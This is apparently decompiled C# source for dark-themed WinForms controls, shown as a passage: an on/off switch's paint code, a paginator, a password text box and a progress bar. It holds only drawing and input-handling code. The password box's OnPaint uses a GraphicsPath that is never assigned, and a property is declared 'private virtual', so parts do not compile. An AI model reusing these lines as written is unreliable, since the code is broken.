				arg_23B_0_cp_0[arg_23B_0_cp_1] = point12;
				Point[] arg_253_0_cp_0 = array;
				int arg_253_0_cp_1 = 12;
				Point point13 = default(Point);
				arg_253_0_cp_0[arg_253_0_cp_1] = point13;
				Point[] points = array;
				graphics2.DrawLines(new Pen(this._BorderColour, 2f), points);
				bool flag = this._Toggled == LogInOnOffSwitch.Toggles.Toggled;
				if (flag)
				{
					Graphics arg_2D5_0 = graphics2;
					Brush arg_2D5_1 = new SolidBrush(this._ToggledColour);
					rectangle = new Rectangle((int)Math.Round((double)this.Width / 2.0), 10, (int)Math.Round(unchecked((double)this.Width / 2.0 - 38.0)), 3);
					arg_2D5_0.FillRectangle(arg_2D5_1, rectangle);
					Graphics arg_304_0 = graphics2;
					Brush arg_304_1 = new SolidBrush(this._ToggledColour);
					rectangle = new Rectangle(this.Width - 39, 2, 36, this.Height - 5);
					arg_304_0.FillRectangle(arg_304_1, rectangle);
					Graphics arg_376_0 = graphics2;
					string arg_376_1 = "ON";
					Font arg_376_2 = new Font("Microsoft Sans Serif", 7f, FontStyle.Bold);
					Brush arg_376_3 = new SolidBrush(this._TextColour);
					rectangle = new Rectangle(2, -1, (int)Math.Round(unchecked((double)(checked(this.Width - 20)) + 6.666666666666667)), this.Height);
					arg_376_0.DrawString(arg_376_1, arg_376_2, arg_376_3, rectangle, new StringFormat
					{
						Alignment = StringAlignment.Far,
						LineAlignment = StringAlignment.Center
					});
					Graphics arg_3E8_0 = graphics2;
					string arg_3E8_1 = "OFF";
					Font arg_3E8_2 = new Font("Microsoft Sans Serif", 7f, FontStyle.Bold);
					Brush arg_3E8_3 = new SolidBrush(this._NonToggledTextColour);
					rectangle = new Rectangle(7, -1, (int)Math.Round(unchecked((double)(checked(this.Width - 20)) + 6.666666666666667)), this.Height);
					arg_3E8_0.DrawString(arg_3E8_1, arg_3E8_2, arg_3E8_3, rectangle, new StringFormat
					{
						Alignment = StringAlignment.Near,
						LineAlignment = StringAlignment.Center
					});
				}
				else
				{
					flag = (this._Toggled == LogInOnOffSwitch.Toggles.NotToggled);
					if (flag)
					{
						Graphics arg_471_0 = graphics2;
						string arg_471_1 = "OFF";
						Font arg_471_2 = new Font("Microsoft Sans Serif", 7f, FontStyle.Bold);
						Brush arg_471_3 = new SolidBrush(this._TextColour);
						rectangle = new Rectangle(7, -1, (int)Math.Round(unchecked((double)(checked(this.Width - 20)) + 6.666666666666667)), this.Height);
						arg_471_0.DrawString(arg_471_1, arg_471_2, arg_471_3, rectangle, new StringFormat
						{
							Alignment = StringAlignment.Near,
							LineAlignment = StringAlignment.Center
						});
						Graphics arg_4E3_0 = graphics2;
						string arg_4E3_1 = "ON";
						Font arg_4E3_2 = new Font("Microsoft Sans Serif", 7f, FontStyle.Bold);
						Brush arg_4E3_3 = new SolidBrush(this._NonToggledTextColour);
						rectangle = new Rectangle(2, -1, (int)Math.Round(unchecked((double)(checked(this.Width - 20)) + 6.666666666666667)), this.Height);
						arg_4E3_0.DrawString(arg_4E3_1, arg_4E3_2, arg_4E3_3, rectangle, new StringFormat
						{
							Alignment = StringAlignment.Far,
							LineAlignment = StringAlignment.Center
						});
					}
				}
				Graphics arg_544_0 = graphics2;
				Pen arg_544_1 = new Pen(this._BorderColour, 2f);
				point13 = new Point((int)Math.Round((double)this.Width / 2.0), 0);
				Point arg_544_2 = point13;
				point12 = new Point((int)Math.Round((double)this.Width / 2.0), this.Height);
				arg_544_0.DrawLine(arg_544_1, arg_544_2, point12);
			}
		}
	}
}

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("SelectedIndexChanged")]
	public class LogInPaginator : Control
	{
		public delegate void SelectedIndexChangedEventHandler(object sender, EventArgs e);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private GraphicsPath GP1;

		private GraphicsPath GP2;

		private Rectangle R1;

		private Size SZ1;

		private Point PT1;

		private Pen P1;

		private Pen P2;

		private Pen P3;

		private SolidBrush B1;

		private SolidBrush B2;

		private LogInPaginator.SelectedIndexChangedEventHandler SelectedIndexChangedEvent;

		private int _SelectedIndex;

		private int _NumberOfPages;

		private int ItemWidth;

		public event LogInPaginator.SelectedIndexChangedEventHandler SelectedIndexChanged
		{
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			add
			{
				this.SelectedIndexChangedEvent = (LogInPaginator.SelectedIndexChangedEventHandler)Delegate.Combine(this.SelectedIndexChangedEvent, value);
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			remove
			{
				this.SelectedIndexChangedEvent = (LogInPaginator.SelectedIndexChangedEventHandler)Delegate.Remove(this.SelectedIndexChangedEvent, value);
			}
		}

		public int SelectedIndex
		{
			get
			{
				return this._SelectedIndex;
			}
			set
			{
				this._SelectedIndex = Math.Max(Math.Min(value, this.MaximumIndex), 0);
				this.Invalidate();
			}
		}

		public int NumberOfPages
		{
			get
			{
				return this._NumberOfPages;
			}
			set
			{
				this._NumberOfPages = value;
				this._SelectedIndex = Math.Max(Math.Min(this._SelectedIndex, this.MaximumIndex), 0);
				this.Invalidate();
			}
		}

		public int MaximumIndex
		{
			get
			{
				return checked(this.NumberOfPages - 1);
			}
		}

		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				base.Font = value;
				this.Invalidate();
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInPaginator.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInPaginator.__ENCList.Count == LogInPaginator.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInPaginator.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInPaginator.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInPaginator.__ENCList[num] = LogInPaginator.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInPaginator.__ENCList.RemoveRange(num, LogInPaginator.__ENCList.Count - num);
						LogInPaginator.__ENCList.Capacity = LogInPaginator.__ENCList.Count;
					}
					LogInPaginator.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		public GraphicsPath RoundRectangle(Rectangle Rectangle, int Curve)
		{
			GraphicsPath graphicsPath = new GraphicsPath();
			checked
			{
				int num = Curve * 2;
				GraphicsPath arg_2F_0 = graphicsPath;
				Rectangle rect = new Rectangle(Rectangle.X, Rectangle.Y, num, num);
				arg_2F_0.AddArc(rect, -180f, 90f);
				GraphicsPath arg_63_0 = graphicsPath;
				rect = new Rectangle(Rectangle.Width - num + Rectangle.X, Rectangle.Y, num, num);
				arg_63_0.AddArc(rect, -90f, 90f);
				GraphicsPath arg_A1_0 = graphicsPath;
				rect = new Rectangle(Rectangle.Width - num + Rectangle.X, Rectangle.Height - num + Rectangle.Y, num, num);
				arg_A1_0.AddArc(rect, 0f, 90f);
				GraphicsPath arg_D5_0 = graphicsPath;
				rect = new Rectangle(Rectangle.X, Rectangle.Height - num + Rectangle.Y, num, num);
				arg_D5_0.AddArc(rect, 90f, 90f);
				GraphicsPath arg_118_0 = graphicsPath;
				Point point = new Point(Rectangle.X, Rectangle.Height - num + Rectangle.Y);
				Point arg_118_1 = point;
				Point pt = new Point(Rectangle.X, Curve + Rectangle.Y);
				arg_118_0.AddLine(arg_118_1, pt);
				return graphicsPath;
			}
		}

		public GraphicsPath RoundRect(float x, float y, float w, float h, float r = 0.3f, bool TL = true, bool TR = true, bool BR = true, bool BL = true)
		{
			float num = Math.Min(w, h) * r;
			float num2 = x + w;
			float num3 = y + h;
			GraphicsPath graphicsPath = new GraphicsPath();
			GraphicsPath graphicsPath2 = graphicsPath;
			if (TL)
			{
				graphicsPath2.AddArc(x, y, num, num, 180f, 90f);
			}
			else
			{
				graphicsPath2.AddLine(x, y, x, y);
			}
			if (TR)
			{
				graphicsPath2.AddArc(num2 - num, y, num, num, 270f, 90f);
			}
			else
			{
				graphicsPath2.AddLine(num2, y, num2, y);
			}
			if (BR)
			{
				graphicsPath2.AddArc(num2 - num, num3 - num, num, num, 0f, 90f);
			}
			else
			{
				graphicsPath2.AddLine(num2, num3, num2, num3);
			}
			if (BL)
			{
				graphicsPath2.AddArc(x, num3 - num, num, num, 90f, 90f);
			}
			else
			{
				graphicsPath2.AddLine(x, num3, x, num3);
			}
			graphicsPath2.CloseFigure();
			return graphicsPath;
		}

		private void InvalidateItems(PaintEventArgs e)
		{
			this.ItemWidth = checked(e.Graphics.MeasureString("000 ..", this.Font).ToSize().Width + 10);
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			bool flag = e.Button == MouseButtons.Left;
			checked
			{
				if (flag)
				{
					int selectedIndex = this._SelectedIndex;
					flag = (this._SelectedIndex < 4);
					int num;
					if (flag)
					{
						num = e.X / this.ItemWidth;
					}
					else
					{
						flag = (this._SelectedIndex > 3 && this._SelectedIndex < this.MaximumIndex - 3);
						if (flag)
						{
							num = e.X / this.ItemWidth;
							int num2 = num;
							flag = (num2 == 2);
							if (flag)
							{
								num = selectedIndex;
							}
							else
							{
								flag = (num2 < 2);
								if (flag)
								{
									num = selectedIndex - (2 - num);
								}
								else
								{
									flag = (num2 > 2);
									if (flag)
									{
										num = selectedIndex + (num - 2);
									}
								}
							}
						}
						else
						{
							num = this.MaximumIndex - (4 - e.X / this.ItemWidth);
						}
					}
					flag = (num < this._NumberOfPages && num != selectedIndex);
					if (flag)
					{
						this.SelectedIndex = num;
						LogInPaginator.SelectedIndexChangedEventHandler selectedIndexChangedEvent = this.SelectedIndexChangedEvent;
						flag = (selectedIndexChangedEvent != null);
						if (flag)
						{
							selectedIndexChangedEvent(this, null);
						}
					}
				}
				base.OnMouseDown(e);
			}
		}

		public LogInPaginator()
		{
			LogInPaginator.__ENCAddToList(this);
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.Selectable | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.FromArgb(54, 54, 54);
			Size size = new Size(202, 26);
			this.Size = size;
			this.B1 = new SolidBrush(Color.FromArgb(50, 50, 50));
			this.B2 = new SolidBrush(Color.FromArgb(55, 55, 55));
			this.P1 = new Pen(Color.FromArgb(35, 35, 35));
			this.P2 = new Pen(Color.FromArgb(23, 119, 151));
			this.P3 = new Pen(Color.FromArgb(35, 35, 35));
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			this.InvalidateItems(e);
			Graphics graphics = e.Graphics;
			Graphics graphics2 = graphics;
			graphics2.Clear(this.BackColor);
			graphics2.SmoothingMode = SmoothingMode.AntiAlias;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			bool flag = this._SelectedIndex < 4;
			checked
			{
				if (flag)
				{
					int arg_51_0 = 0;
					int num = Math.Min(this.MaximumIndex, 4);
					int num2 = arg_51_0;
					while (true)
					{
						int arg_85_0 = num2;
						int num3 = num;
						if (arg_85_0 > num3)
						{
							break;
						}
						bool rightEllipse = num2 == 4 && this.MaximumIndex > 4;
						this.DrawBox(num2 * this.ItemWidth, num2, false, rightEllipse, graphics);
						num2++;
					}
				}
				else
				{
					flag = (this._SelectedIndex > 3 && this._SelectedIndex < this.MaximumIndex - 3);
					if (flag)
					{
						int num4 = 0;
						int num3;
						int arg_EA_0;
						do
						{
							bool leftEllipse = num4 == 0;
							bool rightEllipse = num4 == 4;
							this.DrawBox(num4 * this.ItemWidth, this._SelectedIndex + num4 - 2, leftEllipse, rightEllipse, graphics);
							num4++;
							arg_EA_0 = num4;
							num3 = 4;
						}
						while (arg_EA_0 <= num3);
					}
					else
					{
						int num5 = 0;
						int num3;
						int arg_131_0;
						do
						{
							bool leftEllipse = num5 == 0 && this.MaximumIndex > 4;
							this.DrawBox(num5 * this.ItemWidth, this.MaximumIndex - (4 - num5), leftEllipse, false, graphics);
							num5++;
							arg_131_0 = num5;
							num3 = 4;
						}
						while (arg_131_0 <= num3);
					}
				}
			}
		}

		private void DrawBox(int x, int index, bool leftEllipse, bool rightEllipse, Graphics g)
		{
			checked
			{
				this.R1 = new Rectangle(x, 0, this.ItemWidth - 4, this.Height - 1);
				this.GP1 = this.RoundRectangle(this.R1, 4);
				Rectangle rectangle = new Rectangle(this.R1.X + 1, this.R1.Y + 1, this.R1.Width - 2, this.R1.Height - 2);
				this.GP2 = this.RoundRectangle(rectangle, 4);
				string text = Conversions.ToString(index + 1);
				if (leftEllipse)
				{
					text = ".. " + text;
				}
				if (rightEllipse)
				{
					text += " ..";
				}
				this.SZ1 = g.MeasureString(text, this.Font).ToSize();
				this.PT1 = new Point(this.R1.X + (this.R1.Width / 2 - this.SZ1.Width / 2), this.R1.Y + (this.R1.Height / 2 - this.SZ1.Height / 2));
				bool flag = index == this._SelectedIndex;
				if (flag)
				{
					g.FillPath(this.B1, this.GP1);
					Font font = new Font(this.Font, FontStyle.Underline);
					g.DrawString(text, font, Brushes.Black, (float)(this.PT1.X + 1), (float)(this.PT1.Y + 1));
					g.DrawString(text, font, Brushes.White, this.PT1);
					font.Dispose();
					g.DrawPath(this.P1, this.GP2);
					g.DrawPath(this.P2, this.GP1);
				}
				else
				{
					g.FillPath(this.B2, this.GP1);
					g.DrawString(text, this.Font, Brushes.Black, (float)(this.PT1.X + 1), (float)(this.PT1.Y + 1));
					g.DrawString(text, this.Font, Brushes.White, this.PT1);
					g.DrawPath(this.P3, this.GP2);
					g.DrawPath(this.P1, this.GP1);
				}
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	[DefaultEvent("TextChanged")]
	public class LogInPassTextBox : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private MouseState State;

		[AccessedThroughProperty("TB")]
		private TextBox _TB;

		private Color _BaseColour;

		private Color _TextColour;

		private Color _BorderColour;

		private HorizontalAlignment _TextAlign;

		private int _MaxLength;

		private bool _ReadOnly;

		private bool _UseSystemPasswordChar;

		private bool _Multiline;

		private virtual TextBox TB
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TB;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TB = value;
			}
		}

		[Category("Options")]
		public HorizontalAlignment TextAlign
		{
			get
			{
				return this._TextAlign;
			}
			set
			{
				this._TextAlign = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.TextAlign = value;
				}
			}
		}

		[Category("Options")]
		public int MaxLength
		{
			get
			{
				return this._MaxLength;
			}
			set
			{
				this._MaxLength = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.MaxLength = value;
				}
			}
		}

		[Category("Options")]
		public bool ReadOnly
		{
			get
			{
				return this._ReadOnly;
			}
			set
			{
				this._ReadOnly = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.ReadOnly = value;
				}
			}
		}

		[Category("Options")]
		public bool UseSystemPasswordChar
		{
			get
			{
				return this._UseSystemPasswordChar;
			}
			set
			{
				this._UseSystemPasswordChar = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.UseSystemPasswordChar = value;
				}
			}
		}

		[Category("Options")]
		public bool Multiline
		{
			get
			{
				return this._Multiline;
			}
			set
			{
				this._Multiline = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Multiline = value;
						if (value)
						{
							this.TB.Height = this.Height - 11;
						}
						else
						{
							this.Height = this.TB.Height + 11;
						}
					}
				}
			}
		}

		[Category("Options")]
		public override string Text
		{
			get
			{
				return base.Text;
			}
			set
			{
				base.Text = value;
				bool flag = this.TB != null;
				if (flag)
				{
					this.TB.Text = value;
				}
			}
		}

		[Category("Options")]
		public override Font Font
		{
			get
			{
				return base.Font;
			}
			set
			{
				base.Font = value;
				bool flag = this.TB != null;
				checked
				{
					if (flag)
					{
						this.TB.Font = value;
						Control arg_37_0 = this.TB;
						Point location = new Point(3, 5);
						arg_37_0.Location = location;
						this.TB.Width = this.Width - 35;
						flag = !this._Multiline;
						if (flag)
						{
							this.Height = this.TB.Height + 11;
						}
					}
				}
			}
		}

		[Category("Colours")]
		public Color BackgroundColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color TextColour
		{
			get
			{
				return this._TextColour;
			}
			set
			{
				this._TextColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInPassTextBox.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInPassTextBox.__ENCList.Count == LogInPassTextBox.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInPassTextBox.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInPassTextBox.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInPassTextBox.__ENCList[num] = LogInPassTextBox.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInPassTextBox.__ENCList.RemoveRange(num, LogInPassTextBox.__ENCList.Count - num);
						LogInPassTextBox.__ENCList.Capacity = LogInPassTextBox.__ENCList.Count;
					}
					LogInPassTextBox.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnCreateControl()
		{
			base.OnCreateControl();
			bool flag = !this.Controls.Contains(this.TB);
			if (flag)
			{
				this.Controls.Add(this.TB);
			}
		}

		private void OnBaseTextChanged(object s, EventArgs e)
		{
			this.Text = this.TB.Text;
		}

		private void OnBaseKeyDown(object s, KeyEventArgs e)
		{
			bool flag = e.Control && e.KeyCode == Keys.A;
			if (flag)
			{
				this.TB.SelectAll();
				e.SuppressKeyPress = true;
			}
			flag = (e.Control && e.KeyCode == Keys.C);
			if (flag)
			{
				this.TB.Copy();
				e.SuppressKeyPress = true;
			}
		}

		protected override void OnResize(EventArgs e)
		{
			Control arg_12_0 = this.TB;
			Point location = new Point(5, 5);
			arg_12_0.Location = location;
			checked
			{
				this.TB.Width = this.Width - 35;
				bool multiline = this._Multiline;
				if (multiline)
				{
					this.TB.Height = this.Height - 11;
				}
				else
				{
					this.Height = this.TB.Height + 11;
				}
				base.OnResize(e);
			}
		}

		protected override void OnMouseDown(MouseEventArgs e)
		{
			base.OnMouseDown(e);
			this.State = MouseState.Down;
			this.Invalidate();
		}

		protected override void OnMouseUp(MouseEventArgs e)
		{
			base.OnMouseUp(e);
			this.State = MouseState.Over;
			this.TB.Focus();
			this.Invalidate();
		}

		protected override void OnMouseLeave(EventArgs e)
		{
			base.OnMouseLeave(e);
			this.State = MouseState.None;
			this.Invalidate();
		}

		public LogInPassTextBox()
		{
			LogInPassTextBox.__ENCAddToList(this);
			this.State = MouseState.None;
			this._BaseColour = Color.FromArgb(255, 255, 255);
			this._TextColour = Color.FromArgb(50, 50, 50);
			this._BorderColour = Color.FromArgb(180, 187, 205);
			this._TextAlign = HorizontalAlignment.Left;
			this._MaxLength = 32767;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
			this.BackColor = Color.Transparent;
			this.TB = new TextBox();
			this.TB.Height = 190;
			this.TB.Font = new Font("Segoe UI", 10f);
			this.TB.Text = this.Text;
			this.TB.BackColor = Color.FromArgb(42, 42, 42);
			this.TB.ForeColor = Color.FromArgb(255, 255, 255);
			this.TB.MaxLength = this._MaxLength;
			this.TB.Multiline = false;
			this.TB.ReadOnly = this._ReadOnly;
			this.TB.UseSystemPasswordChar = this._UseSystemPasswordChar;
			this.TB.BorderStyle = BorderStyle.None;
			Control arg_170_0 = this.TB;
			Point location = new Point(5, 5);
			arg_170_0.Location = location;
			this.TB.Width = checked(this.Width - 35);
			this.TB.TextChanged += new EventHandler(this.OnBaseTextChanged);
			this.TB.KeyDown += new KeyEventHandler(this.OnBaseKeyDown);
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rectangle = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			this.TB.BackColor = Color.FromArgb(42, 42, 42);
			this.TB.ForeColor = Color.FromArgb(255, 255, 255);
			GraphicsPath graphicsPath;
			graphics2.FillPath(new SolidBrush(Color.FromArgb(42, 42, 42)), graphicsPath);
			graphics2.DrawPath(new Pen(new SolidBrush(Color.FromArgb(35, 35, 35)), 2f), graphicsPath);
			graphicsPath.Dispose();
			Graphics arg_106_0 = graphics2;
			Brush arg_106_1 = new SolidBrush(this.FindForm().BackColor);
			checked
			{
				Rectangle rect = new Rectangle(this.Width - 25, this.Height - 60, this.Height + 25, this.Height + 25);
				arg_106_0.FillPie(arg_106_1, rect, 90f, 90f);
				Graphics arg_15A_0 = graphics2;
				Pen arg_15A_1 = new Pen(Color.FromArgb(35, 35, 35), 2f);
				rect = new Rectangle(this.Width - 25, this.Height - 60, this.Height + 25, this.Height + 25);
				arg_15A_0.DrawPie(arg_15A_1, rect, 90f, 90f);
				Graphics arg_17C_0 = graphics2;
				Brush arg_17C_1 = new SolidBrush(this._TextColour);
				rect = new Rectangle(10, 5, 10, 7);
				arg_17C_0.FillEllipse(arg_17C_1, rect);
				graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
			}
		}
	}
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace nj
{
	public class LogInProgressBar : Control
	{
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private Color _ProgressColour;

		private Color _BorderColour;

		private Color _BaseColour;

		private Color _FontColour;

		private Color _SecondColour;

		private int _Value;

		private int _Maximum;

		private bool _TwoColour;

		public Color SecondColour
		{
			get
			{
				return this._SecondColour;
			}
			set
			{
				this._SecondColour = value;
			}
		}

		[Category("Control")]
		public bool TwoColour
		{
			get
			{
				return this._TwoColour;
			}
			set
			{
				this._TwoColour = value;
			}
		}

		[Category("Control")]
		public int Maximum
		{
			get
			{
				return this._Maximum;
			}
			set
			{
				bool flag = value < this._Value;
				if (flag)
				{
					this._Value = value;
				}
				this._Maximum = value;
				this.Invalidate();
			}
		}

		[Category("Control")]
		public int Value
		{
			get
			{
				int value = this._Value;
				bool flag = value == 0;
				int result;
				if (flag)
				{
					result = 0;
				}
				else
				{
					result = this._Value;
				}
				return result;
			}
			set
			{
				int num = value;
				bool flag = num > this._Maximum;
				if (flag)
				{
					value = this._Maximum;
					this.Invalidate();
				}
				this._Value = value;
				this.Invalidate();
			}
		}

		[Category("Colours")]
		public Color ProgressColour
		{
			get
			{
				return this._ProgressColour;
			}
			set
			{
				this._ProgressColour = value;
			}
		}

		[Category("Colours")]
		public Color BaseColour
		{
			get
			{
				return this._BaseColour;
			}
			set
			{
				this._BaseColour = value;
			}
		}

		[Category("Colours")]
		public Color BorderColour
		{
			get
			{
				return this._BorderColour;
			}
			set
			{
				this._BorderColour = value;
			}
		}

		[Category("Colours")]
		public Color FontColour
		{
			get
			{
				return this._FontColour;
			}
			set
			{
				this._FontColour = value;
			}
		}

		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = LogInProgressBar.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					bool flag = LogInProgressBar.__ENCList.Count == LogInProgressBar.__ENCList.Capacity;
					if (flag)
					{
						int num = 0;
						int arg_3F_0 = 0;
						int num2 = LogInProgressBar.__ENCList.Count - 1;
						int num3 = arg_3F_0;
						while (true)
						{
							int arg_90_0 = num3;
							int num4 = num2;
							if (arg_90_0 > num4)
							{
								break;
							}
							WeakReference weakReference = LogInProgressBar.__ENCList[num3];
							flag = weakReference.IsAlive;
							if (flag)
							{
								bool flag2 = num3 != num;
								if (flag2)
								{
									LogInProgressBar.__ENCList[num] = LogInProgressBar.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						LogInProgressBar.__ENCList.RemoveRange(num, LogInProgressBar.__ENCList.Count - num);
						LogInProgressBar.__ENCList.Capacity = LogInProgressBar.__ENCList.Count;
					}
					LogInProgressBar.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		protected override void OnResize(EventArgs e)
		{
			base.OnResize(e);
			this.Height = 25;
		}

		protected override void CreateHandle()
		{
			base.CreateHandle();
			this.Height = 25;
		}

		public void Increment(int Amount)
		{
			checked
			{
				this.Value += Amount;
			}
		}

		public LogInProgressBar()
		{
			LogInProgressBar.__ENCAddToList(this);
			this._ProgressColour = Color.FromArgb(0, 160, 199);
			this._BorderColour = Color.FromArgb(35, 35, 35);
			this._BaseColour = Color.FromArgb(42, 42, 42);
			this._FontColour = Color.FromArgb(50, 50, 50);
			this._SecondColour = Color.FromArgb(0, 145, 184);
			this._Value = 0;
			this._Maximum = 100;
			this._TwoColour = true;
			this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
			this.DoubleBuffered = true;
		}

		protected override void OnPaint(PaintEventArgs e)
		{
			Graphics graphics = e.Graphics;
			Rectangle rect = new Rectangle(0, 0, this.Width, this.Height);
			Graphics graphics2 = graphics;
			graphics2.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
			graphics2.SmoothingMode = SmoothingMode.HighQuality;
			graphics2.PixelOffsetMode = PixelOffsetMode.HighQuality;
			graphics2.Clear(this.BackColor);
			checked
			{
				int num = (int)Math.Round(unchecked((double)this._Value / (double)this._Maximum * (double)this.Width));
				int value = this.Value;
				bool flag = value == 0;
				if (flag)
				{
					graphics2.FillRectangle(new SolidBrush(this._BaseColour), rect);
					Graphics arg_B3_0 = graphics2;
					Brush arg_B3_1 = new SolidBrush(this._ProgressColour);
					Rectangle rectangle = new Rectangle(0, 0, num - 1, this.Height);
					arg_B3_0.FillRectangle(arg_B3_1, rectangle);
					graphics2.DrawRectangle(new Pen(this._BorderColour, 3f), rect);
				}
				else
				{
					flag = (value == this._Maximum);
					if (flag)
					{
						graphics2.FillRectangle(new SolidBrush(this._BaseColour), rect);
						Graphics arg_121_0 = graphics2;
						Brush arg_121_1 = new SolidBrush(this._ProgressColour);
						Rectangle rectangle = new Rectangle(0, 0, num - 1, this.Height);
						arg_121_0.FillRectangle(arg_121_1, rectangle);
						flag = this._TwoColour;
						if (flag)
						{
							Graphics arg_172_0 = graphics;
							rectangle = new Rectangle(0, -10, (int)Math.Round(unchecked((double)(checked(this.Width * this._Value)) / (double)this._Maximum - 1.0)), this.Height - 5);
							arg_172_0.SetClip(rectangle);
							double arg_19B_0 = 0.0;
							double num2 = (double)((this.Width - 1) * this._Maximum) / (double)this._Value;
							double num3 = arg_19B_0;
							while (true)
							{
								double arg_201_0 = num3;
								double num4 = num2;
								if (arg_201_0 > num4)
								{
									break;
								}
								Graphics arg_1E7_0 = graphics;
								Pen arg_1E7_1 = new Pen(new SolidBrush(this._SecondColour), 7f);
								Point point = new Point((int)Math.Round(num3), 0);
								Point arg_1E7_2 = point;
								Point point2 = new Point((int)Math.Round(unchecked(num3 - 15.0)), this.Height);
								arg_1E7_0.DrawLine(arg_1E7_1, arg_1E7_2, point2);
								unchecked
								{
									num3 += 25.0;
								}
							}
							graphics.ResetClip();
						}
						graphics2.DrawRectangle(new Pen(this._BorderColour, 3f), rect);
					}
					else
					{
						graphics2.FillRectangle(new SolidBrush(this._BaseColour), rect);
						Graphics arg_263_0 = graphics2;
						Brush arg_263_1 = new SolidBrush(this._ProgressColour);
						Rectangle rectangle = new Rectangle(0, 0, num - 1, this.Height);
						arg_263_0.FillRectangle(arg_263_1, rectangle);
						flag = this._TwoColour;
						if (flag)
						{
							Graphics arg_2B4_0 = graphics2;
							rectangle = new Rectangle(0, 0, (int)Math.Round(unchecked((double)(checked(this.Width * this._Value)) / (double)this._Maximum - 1.0)), this.Height - 1);
							arg_2B4_0.SetClip(rectangle);
							double arg_2DD_0 = 0.0;
							double num5 = (double)((this.Width - 1) * this._Maximum) / (double)this._Value;
							double num6 = arg_2DD_0;
							while (true)
							{
								double arg_34A_0 = num6;
								double num4 = num5;
								if (arg_34A_0 > num4)
								{
									break;
								}
								Graphics arg_32D_0 = graphics2;
								Pen arg_32D_1 = new Pen(new SolidBrush(this._SecondColour), 7f);
